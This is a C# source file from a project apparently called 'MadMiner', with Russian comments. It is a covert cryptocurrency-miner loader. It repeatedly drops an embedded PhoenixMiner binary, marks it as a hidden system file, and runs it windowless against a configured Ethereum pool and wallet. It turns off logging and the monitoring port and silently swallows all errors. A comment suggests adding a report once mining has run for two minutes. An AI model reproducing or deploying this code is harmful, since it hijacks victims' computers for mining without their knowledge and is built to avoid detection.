using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace MadMiner.Miner
{
    class PhoenixMiner
    {
        [STAThread]
        public static void Run() // PhoenixMiner.Run();
        {
            try
            {
                while (true)
                {
                    Process[] pname = Process.GetProcessesByName(Settings.poenixProc);
                    if (pname.Length == 0)
                    {
                        // Проверяем наличие файла XMRIG Если нету то извлекаем
                        if (!File.Exists(Settings.poenixBin))
                        {

                            File.WriteAllBytes(Settings.poenixBin, Properties.Resources.PhoenixAPI);

                            // Скрываемся
                            File.SetAttributes(Settings.poenixBin, FileAttributes.Hidden | FileAttributes.System);

                            Thread.Sleep(2000);
                            GetMiner();
                        }
                        else
                        {
                            GetMiner();
                        }
                    }
                    else
                    {
                        Thread.Sleep(2000);
                    }

                    Thread.Sleep(2000);
                }
            }
            catch { }
        }



        static void GetMiner()
        {
            try
            {
                /* Запуск майнера через cmd */
                Process process = new Process();
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.Arguments = " -epool " + Settings.poenixPool + " -ewal " + Settings.ethWallet + " -worker Phoenix -epsw x -mode 1 -Rmode 1 -log 0 -mport 0 -etha 0 -retrydelay 1 -ftime 55 -tt 79 -tstop 90 -tstart 80 -coin eth";
                process.StartInfo.FileName = Settings.poenixBin;
                process.Start();


                new Thread(() =>
                {
                    Thread.Sleep(120000);
                    Process[] pname = Process.GetProcessesByName(Settings.poenixProc);
                    if (pname.Length == 0)
                    {

                    }
                    else
                    {
                        // Выполняем если майнинг включен уже 2 минуты! Можно прикрутить например отчет что майнер работает.
                    }

                }).Start();
            }
            catch { }
        }
    }
}
